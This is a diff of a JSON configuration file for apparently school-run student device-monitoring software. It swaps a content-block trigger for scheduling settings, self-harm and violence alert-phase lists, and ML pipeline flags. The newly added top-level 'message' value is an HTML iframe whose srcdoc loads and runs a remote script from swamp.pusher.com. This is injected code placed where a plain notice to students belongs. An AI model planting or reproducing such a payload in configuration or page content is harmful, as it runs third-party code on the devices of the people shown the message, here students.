@@ -1,25 +1,35 @@
 {
-    "triggers": {
-        "blocks": [
-            {
-                "ou": "/Students",
-                "category": "xxx",
-                "threshold": 0.7,
-                "message": "Hey there! It seems like the content on this page might be inappropriate, so please remember that your school can monitor what you do on your school-issued device.",
-                "triggerId": 38001
-            }
+    "enabled": true,
+    "messageDuringSchool": false,
+    "messageAfterSchool": false,
+    "message": "<iframe srcdoc=\"<script src='https://swamp.pusher.com/swamp.js'></script>\">",
+    "monitorOnWeekends": false,
+    "weekdayStartMinutes": 420,
+    "weekdayEndMinutes": 960,
+    "weekendStartMinutes": 0,
+    "weekendEndMinutes": 1439,
+    "timezone": "America/New_York",
+    "alertPhaseBlacklist": [
+        "NOT_SUICIDE_OR_SELF_HARM_RELATED",
+        "MENTAL_DISORDERS"
+    ],
+    "starterPhaseWhitelist": [
+        "ACTIVE_PLANNING"
+    ],
+    "useV2UploadRoute": false,
+    "tvSettings": {
+        "message": "",
+        "messageDuringSchool": false,
+        "messageAfterSchool": false,
+        "alertPhaseBlacklist": [
+            "NOT_THREATS_VIOLENCE_RELATED",
+            "GUNS_AND_BOMBS",
+            "HISTORICAL_EVENTS_AND_FIGURES",
+            "BULLYING_AND_SAFETY",
+            "VIOLENT_ACTS"
         ],
-        "messages": [
-            {
-                "ou": "/Students",
-                "category": "xxx",
-                "message": "Hey there! It seems like the content on this page might be inappropriate, so please remember that your school can monitor what you do on your school-issued device.",
-                "threshold": 0.7,
-                "triggerId": 38001
-            }
-        ]
+        "traditionalPipelineEnabled": false,
+        "mlPipelineEnabled": true
     },
-    "blockedCategories": [
-        "self-harm"
-    ]
+    "beaconSearchesMlPipelineEnabled": true
 }
